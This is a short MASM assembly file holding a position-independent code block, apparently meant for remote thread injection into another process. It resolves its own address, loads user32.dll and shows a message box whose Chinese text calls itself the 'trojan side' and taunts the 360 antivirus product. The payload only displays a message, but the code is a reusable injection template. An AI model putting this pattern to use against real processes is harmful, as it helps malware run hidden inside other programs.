

include  Macro.inc

CODE_START   equ    this byte
    lpLoadLibrary     dd      0
    lpGetProcAddress  dd      0
	_CodeThread    proc
	    jmp @F
		    lpdll    db   "user32.dll",0
			lpAPI    db   "MessageBoxA",0
			lpTestMsg db  "远程代码执行完毕！测试成功！",13,10
			          db  "  这里是木马端！亲爱的360，么么哒~",13,10
					  db  "                      ——BY CrazyHarb",0
			lpText   db  "By CrazyHarb",0
		@@:
	        call @F
		@@:
		    pop  ebx
			sub  ebx,offset @B
			mov  eax,offset lpdll
	        add  eax,ebx
			_invoke [ebx + lpLoadLibrary],eax
			mov  esi,eax
			mov  eax,offset lpAPI
			add  eax,ebx
			_invoke [ebx + lpGetProcAddress],esi,eax
			mov  esi,eax
			mov  eax,offset lpTestMsg
			add  eax,ebx
			mov  edi,offset lpText
			add  edi,ebx
			_invoke esi,NULL,eax,edi,NULL
			ret
	_CodeThread   endp
	
CODE_END    equ   this byte

CODE_LENGTH  equ  offset CODE_END - offset CODE_START + 1
